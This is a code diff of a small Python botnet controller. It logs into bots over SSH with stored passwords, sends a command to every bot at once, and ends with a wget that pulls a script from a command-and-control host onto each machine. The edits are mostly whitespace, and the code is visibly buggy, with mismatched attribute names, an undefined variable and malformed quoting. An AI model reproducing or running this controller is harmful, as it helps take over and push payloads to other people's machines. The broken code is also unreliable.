@@ -8,6 +8,7 @@ class Bot:
         self.password = password
         self.sessions = self.ssh()
 
+        
     # Secure shell into client
     def ssh(self):
         try:
@@ -18,12 +19,14 @@ class Bot:
             print('Connection failure')
             print(e)
 
+            
     # Send command to client
     def send_command(self, cmd):
         self.session.sendline(cmd)
         self.session.prompt()
         return self.session.before
 
+    
     # Send a command to all bots in the botnet
     def command_bots(command):
         for bot in botnet:
@@ -31,8 +34,8 @@ class Bot:
             print('Output from ' + bot.host)
             print(attack)
 
-# List of bots in botnet
 botnet = []
+
 
 def add_bot(host, user, password):
     # Add a new bot to your botnet
@@ -41,8 +44,6 @@ def add_bot(host, user, password):
 
 add_bot('{HOST IP}', '', '')
 
-# List user home directory
+# List user home directory and download
 command_bots('ls')
-
-# Download scripts/files
 command_bots("""wget -O /Users/Admin/Desktop/ "http://c&cserver.com/script.py"""")
